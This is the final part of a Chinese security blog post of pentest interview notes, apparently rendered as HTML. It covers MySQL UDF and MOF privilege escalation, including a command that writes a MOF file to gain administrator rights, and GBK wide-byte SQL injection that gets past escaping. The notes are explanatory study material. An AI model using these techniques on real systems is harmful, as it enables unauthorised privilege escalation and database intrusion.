+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.mysql&lt;5.1导出目录c:/windows或 system32</span><br><span class="line">2.mysql=&gt;5.1导出安装目录/lib/plugin/</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>流程：将udf文件放到指定位置，引入自定义函数，执行自定义函数。</p>
+<p>MOF提权</p>
+<ol>
+<li>select load file('c:/wmpub/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mov'</li>
+<li>执行成功后，即可添加一个普通用户，更改命令，再上传导出执行把用户提升到管理员权限，然后连接3389连接</li>
+</ol>
+<h2 id="23-宽字节注入"><a href="#23-宽字节注入" class="headerlink" title="23.宽字节注入"></a>23.宽字节注入</h2><p>魔术引号开关</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">magic_quotes_gpc,对用户post、get、cookie提交的数据增加转义字符\</span><br><span class="line">单引号，双引号，反斜线都会被加上反斜线</span><br></pre></td></tr></table></figure>
+
+<p>gbk编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\是%5c，可以使用%df吃掉%5c，因为它俩加起来是个汉字</span><br></pre></td></tr></table></figure>
+
+<p>有关函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php中存在一个addslashes()函数，添加反斜杠</span><br><span class="line">在数据进入服务器之前，mysql_query(“SET NAMES gbk”);将MySQL的三个字符集设置为 gbk 编码</span><br><span class="line">character_set_client告诉MySQL Server，传入的是gbk编码，也就是’被当做了%5C%27传入</span><br><span class="line">character_set_connection-&gt; table charset这里我们需要关注下所使用的表的字符集</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="24-代理转发工具"><a href="#24-代理转发工具" class="headerlink" title="24.代理转发工具"></a>24.代理转发工具</h2><p>内网穿透工具frp、</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>原创技术分享，您的支持将鼓励我继续创作</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="Spring 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Spring 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+	  
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%9D%82%E8%AF%86/" rel="tag"># 杂识</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/01/Fastjson%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" rel="prev" title="Fastjson漏洞详解">
+      <i class="fa fa-chevron-left"></i> Fastjson漏洞详解
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/04/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="next" title="权限提升">
+      权限提升 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">面试题整理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-sqlmap-%E2%80%93os-shell%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.</span> <span class="nav-text">1.sqlmap –os-shell原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Mysql%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.2.</span> <span class="nav-text">2.Mysql上传文件的条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-TCP%E5%92%8CUDP%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">1.3.</span> <span class="nav-text">3.TCP和UDP的区别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E7%9A%84%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.4.</span> <span class="nav-text">4.常见端口的协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-http-only%E7%9A%84%E4%BD%9C%E7%94%A8%EF%BC%8C%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96cookie"><span class="nav-number">1.5.</span> <span class="nav-text">5.http only的作用，以及如何获取cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E5%86%B0%E8%9D%8E%E3%80%81%E5%93%A5%E6%96%AF%E6%8B%89%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="nav-number">1.6.</span> <span class="nav-text">6.冰蝎、哥斯拉的流量特征</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-Kerberos%E5%8D%8F%E8%AE%AE%EF%BC%8CPAC%E8%BF%98%E6%9C%89%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="nav-number">1.7.</span> <span class="nav-text">7.Kerberos协议，PAC还有黄金票据和白银票据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-Codeql"><span class="nav-number">1.8.</span> <span class="nav-text">8.Codeql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B"><span class="nav-number">1.9.</span> <span class="nav-text">9.渗透流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-%E7%BB%95%E8%BF%87CDN%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93"><span class="nav-number">1.10.</span> <span class="nav-text">10.绕过CDN方法总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-phpinfo%E4%BD%A0%E4%BC%9A%E5%85%B3%E6%B3%A8%E5%93%AA%E4%BA%9B%E4%BF%A1%E6%81%AF"><span class="nav-number">1.11.</span> <span class="nav-text">11.phpinfo你会关注哪些信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">1.12.</span> <span class="nav-text">12.权限维持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-xss%E4%B9%8Bhref%E8%BE%93%E5%87%BA%E9%98%B2%E6%8A%A4"><span class="nav-number">1.13.</span> <span class="nav-text">13.xss之href输出防护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-samesite%E9%98%B2%E5%BE%A1CSRF%E7%9A%84%E5%8E%9F%E7%90%86"><span class="nav-number">1.14.</span> <span class="nav-text">14.samesite防御CSRF的原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#15-json%E6%A0%BC%E5%BC%8F%E7%9A%84CSRF%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1"><span class="nav-number">1.15.</span> <span class="nav-text">15.json格式的CSRF如何防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8F%E5%92%8C%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F"><span class="nav-number">1.16.</span> <span class="nav-text">16.浏览器解析顺序和解码顺序</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Spring"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Spring</p>
+  <div class="site-description" itemprop="description">见到一座山，就想知道山后面是什么。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yourname" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yourname" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_49502930" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_49502930" rel="noopener" target="_blank"><i class="crosshairs fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Spring</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":"true#是否在手机端显示"},"log":false});</script></body>
+</html>
